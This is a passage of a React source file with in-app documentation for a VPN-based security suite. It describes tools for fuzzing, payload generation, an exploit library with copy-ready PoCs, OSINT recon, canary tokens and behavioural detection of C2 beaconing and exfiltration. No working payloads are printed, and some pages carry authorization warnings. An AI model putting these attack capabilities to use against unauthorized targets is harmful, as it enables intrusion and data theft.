            { t: "DNS Brute-Force", d: "Send DNS resolution requests for common subdomain patterns (www, api, dev, staging, mail, cdn, etc.)." },
            { t: "Reverse DNS / ASN Lookup", d: "Identify all IPs owned by the target's ASN and attempt reverse DNS resolution to find additional hosts." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Export Results</h4>
        <p className="text-[10px] font-mono text-primary/83">Export discovered subdomains as a plain text list or JSON. Send directly to the Security Audit tool for a quick TLS/header check across all found domains.</p>
        <Note type="info">CT log enumeration is always anonymous — it never contacts the target domain. DNS brute-force sends packets to your DNS resolver, not to the target directly.</Note>
      </div>
    ),
  },
  {
    id: "intruder", title: "Intruder", icon: Swords,
    content: (
      <div className="space-y-3">
        <p>The <strong>Intruder</strong> (<code>/intruder</code>) automates parameter fuzzing across multiple payload sets. Modeled after Burp Intruder — inject payloads at any marked position in a request template. Command Center Pro only.</p>
        <h4 className="font-bold text-primary text-[11px]">Attack Modes</h4>
        <div className="space-y-2">
          {[
            { t: "Sniper", d: "One payload set. Injects each payload into one position at a time, cycling through all positions sequentially. Best for single-parameter fuzzing." },
            { t: "Battering Ram", d: "One payload set. Injects the same payload into all marked positions simultaneously. Good for testing multi-parameter forms." },
            { t: "Pitchfork", d: "Multiple payload sets (one per position). Iterates all sets in parallel — position 1 gets payload 1[n], position 2 gets payload 2[n]." },
            { t: "Cluster Bomb", d: "Multiple payload sets. Tries every combination of all payloads across all positions. Highest coverage, highest request count." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Using Intruder</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Paste a raw HTTP request or set a base URL + params.</li>
          <li><span className="text-primary/30">2.</span> Mark injection positions with <code>§ § </code> delimiters.</li>
          <li><span className="text-primary/30">3.</span> Load a payload list (paste custom list, use a built-in wordlist, or pull from Payload Generator).</li>
          <li><span className="text-primary/30">4.</span> Set concurrency and delay. Enable Tor for anonymous fuzzing.</li>
          <li><span className="text-primary/30">5.</span> Click <strong>Start Attack</strong>. Filter results by response length, status code, or keywords to find anomalies.</li>
        </ol>
        <Note type="danger">Intruder can send thousands of requests quickly. Only use on targets you are authorized to test.</Note>
      </div>
    ),
  },
  {
    id: "encoder", title: "Encoder / Decoder", icon: Code2,
    content: (
      <div className="space-y-3">
        <p>The <strong>Encoder</strong> (<code>/encoder</code>) provides encoding, decoding, and hashing utilities essential for security testing and development. Command Center Pro only.</p>
        <h4 className="font-bold text-primary text-[11px]">Supported Transforms</h4>
        <div className="grid grid-cols-2 gap-2">
          {[
            { cat: "Encoding", items: ["Base64 (encode/decode)", "URL encode/decode", "HTML entity encode/decode", "Hex encode/decode", "Binary (UTF-8 ↔ binary)"] },
            { cat: "Cryptography", items: ["MD5 hash", "SHA-1 / SHA-256 / SHA-512", "HMAC-SHA256 (with key)", "bcrypt hash (cost factor)", "JWT decode (header + payload)"] },
          ].map(({ cat, items }) => (
            <div key={cat} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary mb-1">{cat}</div>
              {items.map(i => <div key={i} className="text-[9px] font-mono text-primary/83">• {i}</div>)}
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Smart Detect</h4>
        <p className="text-[10px] font-mono text-primary/83">Paste any string and click <strong>Auto-Detect</strong> — the encoder identifies the encoding format and decodes it automatically. Useful for analyzing encoded payloads in HTTP responses or JWT tokens.</p>
      </div>
    ),
  },
  {
    id: "comparer", title: "Request Comparer", icon: GitCompare,
    content: (
      <div className="space-y-3">
        <p>The <strong>Request Comparer</strong> (<code>/comparer</code>) shows a side-by-side diff of two HTTP requests or responses. Equivalent to Burp Comparer. Command Center Pro only.</p>
        <h4 className="font-bold text-primary text-[11px]">Use Cases</h4>
        <div className="space-y-2">
          {[
            { t: "Auth Bypass Detection", d: "Compare an authenticated request and an unauthenticated request — if responses are identical, the endpoint lacks proper auth enforcement." },
            { t: "IDOR Verification", d: "Compare two responses with different user IDs in the parameter — identical data indicates an IDOR vulnerability." },
            { t: "WAF Bypass Testing", d: "Compare a raw payload response vs a tampered payload response to confirm WAF evasion is working." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Diff Modes</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <strong>Words</strong> — highlight individual changed words</div>
          <div>• <strong>Lines</strong> — highlight full changed lines (good for raw HTTP)</div>
          <div>• <strong>Bytes</strong> — byte-level diff for binary responses</div>
          <div>• <strong>Ignore</strong> — optionally ignore headers, timestamps, session IDs</div>
        </div>
      </div>
    ),
  },
  {
    id: "payloads", title: "Payload Generator", icon: Bug,
    content: (
      <div className="space-y-3">
        <p>The <strong>Payload Generator</strong> (<code>/payloads</code>) provides categorized, ready-to-use attack payloads for security testing. Command Center Pro only.</p>
        <h4 className="font-bold text-primary text-[11px]">Payload Categories</h4>
        <div className="grid grid-cols-2 gap-2">
          {[
            { cat: "Injection", items: ["SQL Injection (MySQL, Postgres, MSSQL, Oracle)", "XSS (reflected, stored, DOM, polyglots)", "Server-Side Template Injection (SSTI)", "LDAP Injection", "Command Injection"] },
            { cat: "Server-Side", items: ["SSRF (localhost, cloud metadata endpoints)", "XXE (XML External Entity)", "Path Traversal / LFI", "Deserialization (Java, PHP, Python)", "RCE via Log4j"] },
            { cat: "Evasion", items: ["WAF bypass variants (encoding, case mangling)", "Filter bypass payloads", "Null byte injection", "Unicode normalization attacks"] },
            { cat: "Recon", items: ["Wordlists (admin, backup, API, upload dirs)", "Common credential pairs", "Default password lists", "JWT secret brute-force lists"] },
            { cat: "Windows Reserved Names", items: ["CON, NUL, AUX, PRN with arbitrary extensions (.txt/.php/.exe)", "COM1–COM9 and LPT1–LPT9 device names", "Encoded variants: URL-encoded, double URL-encoded", "JSON and multipart/form-data payload wrapping", "ZIP archive filename injection (24 payloads total)"] },
            { cat: "Parser Confusion", items: ["Nested HTML/script tag splitting", "MathML expression injection", "SVG foreignObject XSS carrier", "Legacy Yahoo-booter script patterns", "Script-within-script polyglots (24 payloads total)"] },
          ].map(({ cat, items }) => (
            <div key={cat} className="border border-primary/10 rounded px-2.5 py-2">
              <div className="text-[10px] font-mono font-bold text-primary mb-1">{cat}</div>
              {items.map(i => <div key={i} className="text-[9px] font-mono text-primary/83">• {i}</div>)}
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Sending Payloads to Other Tools</h4>
        <p className="text-[10px] font-mono text-primary/83">Click <strong>Send to HTTP Probe</strong> to test a payload directly, or <strong>Send to Intruder</strong> to use the payload list as input for an automated attack run. The <strong>Copy All</strong> button copies every payload in the selected category as newline-separated text for use in external tools like ffuf, sqlmap, or Burp Suite.</p>
      </div>
    ),
  },
  {
    id: "cvesearch", title: "CVE Lookup", icon: ShieldAlert,
    content: (
      <div className="space-y-3">
        <p>The <strong>CVE Lookup</strong> (<code>/cve-search</code>) lets you search the NVD (National Vulnerability Database) and other CVE sources directly from the Command Center. Command Center Pro only.</p>
        <h4 className="font-bold text-primary text-[11px]">Search Modes</h4>
        <div className="space-y-2">
          {[
            { t: "CVE ID Lookup", d: "Enter a CVE ID (e.g. CVE-2021-44228) to pull the full description, CVSS score, affected versions, and available patches." },
            { t: "Keyword Search", d: "Search by software name, vendor, or vulnerability type (e.g. 'Apache Log4j', 'WordPress plugin RCE', 'OpenSSL buffer overflow')." },
            { t: "CVSS Score Filter", d: "Filter results by CVSS score — focus on Critical (9.0–10.0) or High (7.0–8.9) vulnerabilities only." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">CVSS Score Reference</h4>
        <div className="space-y-1.5 text-[9px] font-mono">
          {[["9.0 – 10.0", "Critical", "text-red-400"], ["7.0 – 8.9", "High", "text-orange-400"], ["4.0 – 6.9", "Medium", "text-yellow-400"], ["0.1 – 3.9", "Low", "text-green-400"]].map(([range, level, color]) => (
            <div key={range} className="flex gap-3 items-center">
              <span className="text-primary/83 w-24">{range}</span>
              <span className={`font-bold ${color}`}>{level}</span>
            </div>
          ))}
        </div>
        <Note type="info">CVE data is pulled live from the NVD API. Results may take 2–3 seconds for high-volume keyword searches. Results are not cached.</Note>
      </div>
    ),
  },
  {
    id: "networkmonitor", title: "Network Traffic Monitor", icon: Activity,
    content: (
      <div className="space-y-3">
        <p>The <strong>Network Monitor</strong> (<code>/network-monitor</code>) provides real-time visibility into every network flow passing through your VPN tunnel — source/destination IPs, ports, protocols, bytes transferred, country, and active threat flags. Available on VPN Basic.</p>
        <h4 className="font-bold text-primary text-[11px]">Live Flow Table</h4>
        <div className="space-y-2">
          {[
            { t: "Source → Destination", d: "Every connection is logged with source IP, destination IP, port, and protocol (TCP/UDP/ICMP). Click any row for full details." },
            { t: "Bytes In / Out", d: "Per-flow bandwidth usage. Useful for identifying bandwidth-heavy apps or unexpected data exfiltration." },
            { t: "Duration", d: "How long each connection has been open. Long-lived connections to unusual IPs may indicate C2 beaconing." },
            { t: "Country Flag", d: "GeoIP lookup on the destination IP. Filter by country to find unexpected foreign connections." },
            { t: "Threat Flag", d: "Red triangle icon if the destination IP matches a known threat feed (AbuseIPDB, Shodan, botnet lists). Hover for threat category." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Protocol Breakdown Tab</h4>
        <p className="text-[10px] font-mono text-primary/83">Switch to the Protocols tab to see a pie chart and table of traffic by protocol (HTTPS, DNS, NTP, SSH, etc.) and by destination country. Quickly identify if a large proportion of your traffic is going to unexpected regions.</p>
        <h4 className="font-bold text-primary text-[11px] mt-3">Packet Capture (PCAP)</h4>
        <p className="text-[10px] font-mono text-primary/83">Click <strong>Capture PCAP</strong> to start a 30-second packet capture on the WireGuard interface. The resulting .pcap file can be opened in Wireshark for deep protocol analysis.</p>
        <Note type="info">The flow table auto-refreshes every 5 seconds. Click any column header to sort. Use the search box to filter by IP, port, or country.</Note>
      </div>
    ),
  },
  {
    id: "dnssinkhole", title: "DNS Sinkhole", icon: Shield,
    content: (
      <div className="space-y-3">
        <p>The <strong>DNS Sinkhole</strong> (<code>/dns-sinkhole</code>) intercepts DNS queries and redirects malicious, ad, and tracking domains to a local null address (0.0.0.0) before they can connect. It acts as a local Pi-hole equivalent built into your VPN. Available on VPN Basic.</p>
        <h4 className="font-bold text-primary text-[11px]">How DNS Sinkholing Works</h4>
        <p className="text-[10px] font-mono text-primary/83">When any device on your VPN tunnel makes a DNS query, the ProxhqVPN DNS resolver checks it against block lists. If the domain matches, the resolver returns 0.0.0.0 instead of the real IP — the connection is dead on arrival. Ads, trackers, and malware never load.</p>
        <h4 className="font-bold text-primary text-[11px] mt-3">Block List Categories</h4>
        <div className="space-y-2">
          {[
            { t: "Ads & Trackers", d: "100,000+ ad networks, analytics trackers, and pixel beacons. Blocks Google Ads, DoubleClick, Facebook Pixel, and most ad exchange networks." },
            { t: "Malware & Phishing", d: "Known malware distribution domains, phishing URLs, and ransomware command-and-control servers. Updated from threat intelligence feeds daily." },
            { t: "Stalkerware & Spyware", d: "Mobile stalkerware domains that silently upload location and contact data. Important for device hygiene." },
            { t: "Coinminer Domains", d: "Cryptomining JavaScript domains used in drive-by mining attacks." },
            { t: "Custom Block/Allow", d: "Add your own domains to block or whitelist. One domain per line. Wildcards supported (*.example.com)." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Query Log</h4>
        <p className="text-[10px] font-mono text-primary/83">The DNS Query Log tab shows every DNS request: timestamp, queried domain, response type (ALLOWED / BLOCKED / SINKHOLED), and which device made the request. Exportable as CSV.</p>
        <Note type="warn">DNS Sinkhole only blocks at the DNS layer. If an app hard-codes IP addresses (bypassing DNS), sinkholing won't stop it. Use the Firewall for IP-level blocking.</Note>
      </div>
    ),
  },
  {
    id: "siem", title: "Security Event Log (SIEM)", icon: Database,
    content: (
      <div className="space-y-3">
        <p>The <strong>SIEM</strong> (<code>/siem</code>) aggregates security events from all ProxhqVPN components — WireGuard tunnel events, SilkWeb honeypot triggers, firewall rule hits, failed auth attempts, and DNS sinkhole blocks — into a single unified event log with filtering, severity classification, and export. Command Center Pro only.</p>
        <h4 className="font-bold text-primary text-[11px]">Event Sources</h4>
        <div className="space-y-2">
          {[
            { t: "WireGuard Tunnel Events", d: "Peer handshakes, connection drops, key rotations, new device authorizations." },
            { t: "SilkWeb Honeypot Hits", d: "Any probe or connection to your decoy services — attacker IP, service targeted, payload captured." },
            { t: "Firewall Rule Hits", d: "Every blocked packet: source IP, destination port, rule matched, action taken." },
            { t: "DNS Sinkhole Blocks", d: "All sinkholed DNS queries — domain blocked, requesting device, timestamp." },
            { t: "Failed Auth Attempts", d: "SSH, HTTP, and API authentication failures with source IP and username tried." },
            { t: "Threat Monitor Alerts", d: "Beacon alerts from all monitoring probes — escalated to SIEM with full context." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Filtering & Search</h4>
        <p className="text-[10px] font-mono text-primary/83">Filter events by: <strong>Severity</strong> (Critical / High / Medium / Low / Info), <strong>Source</strong> (WireGuard / SilkWeb / Firewall / DNS / Auth), <strong>Time Range</strong> (last 1h / 24h / 7d / 30d / custom), or full-text search across event messages and IP addresses.</p>
        <h4 className="font-bold text-primary text-[11px] mt-3">Export & Alerts</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <strong>Export CSV</strong> — download all filtered events as a CSV for external SIEM ingestion</div>
          <div>• <strong>Export JSON</strong> — structured JSON format compatible with Splunk, Elastic, and Graylog</div>
          <div>• <strong>Alert Rules</strong> — create rules that trigger email notifications on specific event patterns</div>
        </div>
        <Note type="info">SIEM events are retained for 90 days. Admin accounts see all events from all nodes; regular users see only events from their own connections.</Note>
      </div>
    ),
  },
  {
    id: "osint", title: "OSINT Recon", icon: Crosshair,
    content: (
      <div className="space-y-3">
        <p>The <strong>OSINT Recon</strong> (<code>/osint-recon</code>) is an open-source intelligence aggregator. Paste any target (IP, domain, email, username, company name) and it fans out across 15+ public intelligence sources in parallel. All queries are routed through the ProxhqVPN tunnel — no source attribution back to you. Command Center Pro only.</p>
        <h4 className="font-bold text-primary text-[11px]">Intelligence Sources</h4>
        <div className="grid grid-cols-2 gap-2">
          {[
            { cat: "Network Intel", items: ["Shodan — open ports, banners, CVEs per IP", "Censys — TLS certs, hosts, ASN data", "WHOIS / RDAP — registrar, org, dates", "BGP / ASN lookup — routing info, ownership"] },
            { cat: "Threat Intel", items: ["AbuseIPDB — abuse score, report history", "VirusTotal — domain/IP reputation", "GreyNoise — internet scanner classification", "URLhaus — malware URL database lookup"] },
            { cat: "Passive DNS", items: ["DNSDumpster — subdomains, MX, NS records", "Certificate Transparency (crt.sh) — all issued TLS certs", "SecurityTrails — historical DNS records", "PassiveDNS — historical A/AAAA records"] },
            { cat: "Social / Leak Intel", items: ["HaveIBeenPwned — email breach check", "Pastebin monitoring — mentions in public pastes", "GitHub dorking — exposed secrets/keys", "LinkedIn scrape — employee enumeration"] },
          ].map(({ cat, items }) => (
            <div key={cat} className="border border-primary/10 rounded px-2.5 py-2">
              <div className="text-[10px] font-mono font-bold text-primary mb-1">{cat}</div>
              {items.map(i => <div key={i} className="text-[9px] font-mono text-primary/83">• {i}</div>)}
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Report Output</h4>
        <p className="text-[10px] font-mono text-primary/83">Results are aggregated into a single collapsible report with color-coded risk scoring. Export as HTML (styled, shareable), PDF, or JSON. Click any finding to drill into the source API response.</p>
        <Note type="warn">OSINT Recon performs passive, read-only queries against public data sources. It does not send any traffic to the target directly. All API calls are made server-side through ProxhqVPN infrastructure.</Note>
      </div>
    ),
  },
  {
    id: "ghost-trace", title: "Ghost Trace — Behavioral Analysis", icon: Eye,
    content: (
      <div className="space-y-3">
        <p><strong>Ghost Trace</strong> (<code>/ghost-trace</code>) is ProxhqVPN's VPN-native agentless behavioral analysis engine. It monitors every WireGuard peer for anomalous outbound patterns — C2 beaconing, data exfiltration, cryptominer callbacks, and lateral movement — without installing anything on the device itself. Command Center Pro only.</p>
        <h4 className="font-bold text-primary text-[11px]">How It Works</h4>
        <p className="text-[10px] font-mono text-primary/83">Ghost Trace passively observes all outbound traffic flows from each registered WireGuard peer. It builds a behavioral baseline over the first 24 hours, then flags anything that deviates: unusual destination IPs, high-frequency small packets (beaconing pattern), data spikes to unusual countries, or traffic to known threat infrastructure.</p>
        <h4 className="font-bold text-primary text-[11px] mt-3">Detection Categories</h4>
        <div className="space-y-2">
          {[
            { t: "C2 Beaconing", d: "Periodic small-packet traffic to a fixed IP at regular intervals (e.g. every 60s). Classic pattern of malware checking in with its command-and-control server." },
            { t: "Data Exfiltration", d: "Sustained large outbound data transfers to IPs not on the device's normal traffic pattern. Flags when bytes-out >> bytes-in over 30+ minutes." },
            { t: "Malicious Destination", d: "Any connection to an IP or domain on threat intelligence feeds (AbuseIPDB, Emerging Threats, Tor exit nodes, known botnet infrastructure)." },
            { t: "Ghost Traffic", d: "Traffic originating from a peer that is not associated with any running application — consistent with rootkits or process-hidden malware." },
            { t: "Anomaly Score", d: "Each peer gets a 0–100 anomaly score. Score > 70 triggers a high-priority alert. Score > 90 auto-populates the Firewall quick-block with the offending IP." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Per-Device Timeline Heatmap</h4>
        <p className="text-[10px] font-mono text-primary/83">Each peer gets a 24-hour traffic timeline heatmap showing hourly activity intensity. Gaps in activity followed by sudden spikes are a common indicator of scheduled malware activity (e.g. nightly exfiltration jobs).</p>
        <h4 className="font-bold text-primary text-[11px] mt-3">Quick-Block Integration</h4>
        <p className="text-[10px] font-mono text-primary/83">Click <strong>Block IP</strong> on any Ghost Trace observation to push the offending IP directly to your Firewall blocklist across all nodes. The peer is still connected to your VPN — only the suspicious destination is blocked.</p>
        <Note type="info">Ghost Trace builds its baseline from the first 24 hours of traffic per peer. New devices added to your WireGuard network will not show alerts for the first 24 hours while the baseline is being established.</Note>
      </div>
    ),
  },
  {
    id: "canary", title: "Canary Tokens", icon: Bell,
    content: (
      <div className="space-y-3">
        <p>The <strong>Canary Tokens</strong> (<code>/canary-tokens</code>) system lets you create invisible tripwires — URLs, email addresses, files, and tokens that alert you the instant someone accesses them. Use them to detect data theft, document exfiltration, and unauthorized access. Command Center Pro only.</p>
        <h4 className="font-bold text-primary text-[11px]">Token Types</h4>
        <div className="space-y-2">
          {[
            { t: "HTTP URL Token", d: "A unique URL that sends an alert with the visitor's IP, browser, OS, and location the moment anyone loads it. Embed in decoy documents, emails, or web pages." },
            { t: "DNS Token", d: "A unique subdomain that fires an alert on any DNS lookup — even from air-gapped systems that can't make HTTP requests. Detects exfiltration via DNS." },
            { t: "Document Token (PDF/DOCX)", d: "Generate a PDF or DOCX file with an embedded HTTP canary. When the file is opened on any internet-connected device, you receive an alert." },
            { t: "Email Token", d: "A unique tracking pixel embedded in an email. Alert fires when the email is opened. Useful for detecting forwarded confidential emails." },
            { t: "AWS Key Token", d: "A fake AWS access key pair. If anyone attempts to use it (e.g., an attacker who found leaked credentials), AWS triggers an alert immediately." },
            { t: "SQL Canary", d: "A fake database row with a canary URL as a value. If an attacker dumps your DB and accesses the URL, you receive an alert with their IP." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Additional Token Types</h4>
        <div className="space-y-2">
          {[
            { t: "Redirect URL Token", d: "Fires an alert AND immediately 302-redirects the visitor to any URL you choose — useful for luring attackers to secondary traps while logging the hit." },
            { t: "PowerShell Cradle Token", d: "An encoded PowerShell download cradle. If an attacker executes it, the canary fires on their machine before any payload downloads." },
            { t: "PDF Document Token", d: "PDF with an embedded Acrobat URL action — fires on open in Adobe Reader, Edge PDF viewer, or any full PDF renderer." },
            { t: "Slack Webhook Token", d: "A fake incoming webhook URL. If an attacker POSTs to it (believing it to be a real Slack token), you receive an alert." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Enriched Alert Details</h4>
        <p className="text-[10px] font-mono text-primary/83">Every token trigger captures a full intelligence package:</p>
        <div className="space-y-1 text-[10px] font-mono text-primary/83 ml-2">
          <div>• <strong>Source IP</strong> — raw IP and Cloudflare CF-Ray header (identifies CDN edge node)</div>
          <div>• <strong>Reverse DNS (PTR)</strong> — hostname of the triggering IP (e.g. crawler.googlebot.com)</div>
          <div>• <strong>GeoIP</strong> — country, city, ISP/org name via ip-api.com enrichment</div>
          <div>• <strong>ASN</strong> — autonomous system number and owner (e.g. AS7922 Comcast)</div>
          <div>• <strong>User Agent</strong> — browser, OS, device type, rendering engine</div>
          <div>• <strong>Accept-Language</strong> — victim's browser locale/language setting</div>
          <div>• <strong>Full Headers</strong> — expandable panel showing every HTTP header sent by the triggering client</div>
          <div>• <strong>Referrer URL</strong> — where the victim came from (if present)</div>
        </div>
        <Note type="info">Canary tokens are one-way — the person accessing them gets no indication that a tracking token fired. They are completely silent. Token triggers also appear in the SIEM event log under "Canary" source.</Note>
      </div>
    ),
  },
  {
    id: "ghostchain", title: "Ghost Chain Exploit Arsenal", icon: GitMerge,
    content: (
      <div className="space-y-3">
        <p>The <strong>Ghost Chain</strong> (<code>/ghost-chain</code>) is ProxhqVPN's integrated exploit reference library and attack chain builder. Select a vulnerability category, browse 200+ exploit techniques, and get ready-to-use PoC code for each. All traffic is routed through the VPN tunnel. Command Center Pro only.</p>
        <h4 className="font-bold text-primary text-[11px]">Exploit Categories</h4>
        <div className="grid grid-cols-2 gap-2">
          {[
            { cat: "Injection", items: ["SQL Injection (blind, UNION, error-based, OOB)", "XSS (reflected, stored, DOM, CSP bypass)", "Server-Side Template Injection (Jinja2, Twig, Freemarker)", "Command Injection (Linux, Windows, PowerShell)", "LDAP / NoSQL / XPATH Injection"] },
            { cat: "Server-Side Vulnerabilities", items: ["SSRF (internal services, cloud metadata, SSRF-to-RCE chains)", "XXE (file read, SSRF via XXE, OOB XXE)", "Deserialization (Java gadget chains, PHP unserialize, Python pickle)", "Path Traversal / LFI (directory traversal, null byte, log poisoning)", "RCE via Log4Shell / Spring4Shell"] },
            { cat: "Authentication & Tokens", items: ["JWT attacks (alg:none, HMAC confusion, kid injection)", "OAuth 2.0 flaws (open redirect, state fixation)", "Password reset poisoning", "Broken SAML assertions", "API key bruteforce patterns"] },
            { cat: "Web & Protocol Attacks", items: ["CORS misconfiguration exploitation", "HTTP Request Smuggling (CL.TE, TE.CL)", "WebSocket hijacking", "Cache poisoning", "Subdomain takeover chains"] },
          ].map(({ cat, items }) => (
            <div key={cat} className="border border-primary/10 rounded px-2.5 py-2">
              <div className="text-[10px] font-mono font-bold text-primary mb-1">{cat}</div>
              {items.map(i => <div key={i} className="text-[9px] font-mono text-primary/83">• {i}</div>)}
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">PoC Code Tabs</h4>
        <p className="text-[10px] font-mono text-primary/83">Each exploit entry has two tabs: <strong>Details</strong> (technique description, CVE references, how the vulnerability works, real-world examples) and <strong>Exploit PoC</strong> (copy-ready attack code in the appropriate language — Python, Bash, JavaScript, SQL, XML, or YAML). One-click copy button on every code block.</p>
        <h4 className="font-bold text-primary text-[11px] mt-3">Send to Other Tools</h4>
        <p className="text-[10px] font-mono text-primary/83">Click <strong>Send to HTTP Probe</strong> from any exploit to pre-fill the payload in the HTTP Probe tool. Click <strong>Send to Intruder</strong> to use a payload list for automated fuzzing. Ghost Chain integrates directly with the rest of the Command Center toolkit.</p>
      </div>
    ),
  },
  {
    id: "exploitimporter", title: "Exploit Importer", icon: Upload,
    content: (
      <div className="space-y-3">
        <p>The <strong>Exploit Importer</strong> (<code>/exploit-import</code>) parses external vulnerability scan reports — from Nessus, Burp Suite, Nikto, ZAP, OpenVAS, or any text-based output — and extracts structured exploit findings with severity ratings, CVE IDs, ready-to-use PoC code, and complete step-by-step exploitation guides for each vulnerability type. Command Center Pro only.</p>
        <h4 className="font-bold text-primary text-[11px]">Two Input Methods</h4>
        <div className="space-y-2">
          {[
            { t: "Paste Text", d: "Paste raw scanner output, copy-pasted Burp Suite findings, manual notes, or any text mentioning vulnerability keywords. The parser extracts all recognizable vulnerability patterns." },
            { t: "Upload File", d: "Drag-and-drop or browse for a file. Supported: .txt, .log, .html, .htm, .xml, .nessus, .json, .zip. ZIP archives are automatically extracted — every readable file inside is parsed." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Detection Patterns (30+ Categories)</h4>
        <div className="grid grid-cols-2 gap-2">
          {[
            { cat: "Injection", items: ["SQL Injection (blind, UNION, error, OOB)", "XSS (reflected/stored/DOM)", "Command Injection", "SSTI (Jinja2, Twig, FreeMarker, ERB)", "LDAP / NoSQL Injection"] },
            { cat: "Server-Side", items: ["SSRF (internal services, cloud metadata)", "XXE (file read, SSRF via XXE)", "LFI / Path Traversal", "RCE / Remote Code Execution", "Java / PHP / Python Deserialization"] },
            { cat: "Auth & Tokens", items: ["JWT Vulnerabilities (alg:none, confusion)", "IDOR (object-level auth bypass)", "CSRF", "Auth Bypass (SQLi in login, param tamper)", "Default & Weak Credentials"] },
            { cat: "Exposure & Config", items: ["Exposed .env / .git repositories", "Hardcoded Secrets & API Keys", "Open Swagger UI / Spring Actuator", "No Rate Limiting", "Weak TLS / Missing Security Headers"] },
            { cat: "API & GraphQL", items: ["CORS Wildcard / Origin Reflection", "Mass Assignment (over-posting)", "GraphQL Introspection + IDOR", "Open Redirect", "Buffer Overflow"] },
            { cat: "CVE-Based", items: ["Named CVE findings (auto-linked to NVD)", "Log4Shell, Spring4Shell, ProxyLogon", "Nuclei template matching", "Metasploit module recommendations"] },
          ].map(({ cat, items }) => (
            <div key={cat} className="border border-primary/10 rounded px-2.5 py-2">
              <div className="text-[10px] font-mono font-bold text-primary mb-1">{cat}</div>
              {items.map(i => <div key={i} className="text-[9px] font-mono text-primary/83">• {i}</div>)}
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Three-Tab Result Cards</h4>
        <div className="space-y-2">
          {[
            { t: "Details Tab", d: "Full evidence text extracted from the scanner report, CVE IDs hyperlinked to NVD, and severity badge. This is the raw finding context from your uploaded file." },
            { t: "Instructions Tab", d: "Complete step-by-step exploitation guide for this exact vulnerability type. Includes: Impact summary, tools required with install commands, before-you-start checklist, numbered attack walkthrough with commands, how to verify it worked, and how to fix it with corrected code examples. Powered by the built-in 24-vulnerability guide library." },
            { t: "Exploit Code Tab", d: "Ready-to-use PoC attack code (Python, Bash, SQL, JavaScript, XML, YAML) specific to the finding type. One-click copy to clipboard." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Download Full Report</h4>
        <p className="text-[10px] font-mono text-primary/83">After scanning, click the green <strong>Download Full Report</strong> button in the results header. A comprehensive <code>.md</code> (Markdown) report is generated on the spot and downloaded to your device. The report includes:</p>
        <div className="space-y-1 text-[10px] font-mono text-primary/83 ml-2">
